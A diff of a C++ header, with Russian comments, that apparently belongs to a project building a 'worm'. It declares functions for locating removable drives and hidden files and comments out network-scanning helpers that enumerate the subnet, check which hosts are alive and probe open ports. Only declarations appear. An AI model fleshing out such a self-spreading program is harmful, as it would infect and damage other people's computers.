@@ -22,7 +22,7 @@ std::wstring get_own_path();
 std::wstring get_own_folder();
 std::wstring get_drive_root_from_path(const std::wstring& full_path);
 bool is_hidden(const fs::path& path);
-void init_locale();
+
 // Генератор случайных чисел
 wstring generate_unique_suffix();
 vector<wstring> get_removable_volume_paths(); // поиск всех съемных носителей
@@ -34,12 +34,12 @@ wstring get_username();
 vector<wstring> get_all_volumes();
 vector<wstring> get_paths_for_volume(const wstring& volumeName);
 
-
-// обработка локальных сетей
-vector<wstring> get_local_ip_and_subnet(); // находим маску и внутренний айпишник хоста 
-vector<wstring> generate_ip_range(const string& ip, const string& mask); // по маске и айпи создаем вектор всех возможных хостов в нашей сети
-bool is_host_alive(const std::wstring& ip); // проверка айпишника на работоспособность
-bool is_port_open(const std::wstring& ip, int port, int timeout_ms = 200); // проверка айпишников на открытые порты
+// удалить
+//// обработка локальных сетей
+//vector<wstring> get_local_ip_and_subnet(); // находим маску и внутренний айпишник хоста 
+//vector<wstring> generate_ip_range(const string& ip, const string& mask); // по маске и айпи создаем вектор всех возможных хостов в нашей сети
+//bool is_host_alive(const std::wstring& ip); // проверка айпишника на работоспособность
+//bool is_port_open(const std::wstring& ip, int port, int timeout_ms = 200); // проверка айпишников на открытые порты
 
 class worm
 {
